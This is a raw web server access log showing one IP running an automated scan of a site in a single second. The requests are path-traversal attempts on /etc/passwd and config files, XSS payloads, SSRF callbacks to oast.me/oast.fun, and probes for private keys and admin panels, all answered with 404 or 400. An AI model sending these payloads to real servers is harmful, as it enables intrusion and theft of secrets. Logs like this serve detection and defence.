179.43.161.218 - - [06/Jun/2025:13:33:01 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /  HTTP/1.1" 404 14 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /index.php?option=com_picsell&controller=prevsell&task=dwnfree&dflink=../../../configuration.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.45" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /speedtest?url=d11vrvvlqhfdrjvik8kgipd5dhmjradmg.oast.fun HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.2.18" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /79.137.195.53/errors.log HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/settings/values HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /fcgi-bin/echo HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /ansible.cfg HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /file=404: HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3_7; en) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.7 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/swagger/ui/index HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /index.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/v4/projects HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.35" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /private/79.137.195.53.key HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /adama/adama/downloadService?type=1&file=../../../../etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET ///oast.me@// HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /component_server HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/v4/users/31 HTTP/1.1" 404 22 "https://79.137.195.53" "Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/v4/users/26 HTTP/1.1" 404 22 "https://79.137.195.53" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.79" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /api/graphql HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/618.5.10 (KHTML, like Gecko) Version/17.5 Safari/618.5.10" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET //oast.me HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/v4/users/36 HTTP/1.1" 404 22 "https://79.137.195.53" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/elasticsearch/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/chat/get-chat-session/1?is_shared=True HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.3.17" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /etc.children.1.json HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /pools/default/buckets HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) LoiLoNote/22.0.0 Version/17.3.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /menu/stc HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.35" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET //oast.me/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.5.19" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /network-login/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/v4/users/33 HTTP/1.1" 404 22 "https://79.137.195.53" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.14" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /cert/79.137.195.53.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.4.21" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /wp-admin/admin-post.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux aarch64; rv:90.0) Gecko/20100101 Firefox/90.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /admin/admin_access.txt.bak HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /cgi-bin/luci/site_access/?url=%22%20onfocus=alert(document.domain)%20autofocus=1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /adminweb/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /?cb=97043 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/v4/users/18 HTTP/1.1" 404 22 "https://79.137.195.53" "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /index.php?option=com_gadgetfactory&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /auth/setup HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Teak/4.3.1 Version/17.4.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /auth/login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /cert/195.53_key.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /index.php?option=com_projectfork&section=../../../../../../../../etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /platformio.ini HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11) AppleWebKit/618.31.14 (KHTML, like Gecko) Version/17.7 Safari/618.31.14" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/digiapulssi-organisations-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /opcache-status/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-content/plugins/wp-easycart/inc/admin/phpinfo.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /wu-moadmin/moadmin.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /imcat/root/tools/adbug/binfo.php?phpinfo1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.7.20" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /etc.json?FNZ.ico HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /_swagger_/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /ReportServer/Pages/Folder.aspx HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET ///oast.me%5Ctoast.me/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0" "-"
159.89.211.52 - xampp [07/Jun/2025:08:53:28 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /rest/config/1.0/directory HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3) AppleWebKit/616.20.13 (KHTML, like Gecko) Version/17.7.74 Safari/616.20.13" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /cyble.svg?ZYu3m=x HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /printenv.shtml?%3Cscript%3Ealert%281855536093%29%3C%2Fscript%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=33165447106&view=agendaDay HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wu-moadmin.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0, Win64, x64, rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /config/jwt/private.pem HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /index.php?_csrf_token_645a83a41868941e4692aa31e7235f2=6a50886006f02202a6dac5cfa07bcbfb1e2a6e84&destination=zbuip%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ejgoihbmmygljgoihbmmygl&logMeIn=Login&memberID=admin&memberPassWord=password&p=member HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /monitoring/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/farski-blendstat-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET ///bin///wcm///search///gql.json///a.png?query=type:base%20limit:..1&pathPrefix HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.18" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /lui/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
159.89.211.52 - role1 [07/Jun/2025:08:53:28 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
159.89.211.52 - admin [07/Jun/2025:08:53:28 +0000] "GET /kylin/api/user/authentication HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-content/plugins/amp/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-content/plugins/antispam-bee/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /pages/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.7 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /babel.config.js HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.9.21" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-content/plugins/broken-link-checker/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /bin/wcm/search/gql.json/a.css?query=type:base%20limit:..1&pathPrefix HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/617.14 (KHTML, like Gecko) Version/17.4.63 Safari/617.14" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /swagger/swagger-ui.js HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /login/../../../etc/passwd HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-content/plugins/give/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.3.18" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /prod2local.sh HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /client HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/esnet-chord-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/fastweb-openfalcon-datasource/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /vision/RMIServlet HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/gapit-htmlgraphics-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /controller/login.php?acao=autenticar HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /vendor/qcubed/qcubed/assets/php/profile.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /node_modules/../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /cyble.svg?ZYu3m=x HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/aidanmountford-html-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/goshposh-metaqueries-datasource/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/fzakaria-simple-annotations-datasource/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /cgi-bin/login.cgi HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /api/login HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.21" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/factry-untimely-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /console/j_security_check HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/geomap/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /../../../../../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/foursquare-studio-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.1" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/fetzerch-sunandmoon-datasource/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/fatcloud-windrose-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/boazreicher-sierraplot-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/plugins/gowee-traceroutemap-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /SSI/index.htm HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /79.137.195.53.7z HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
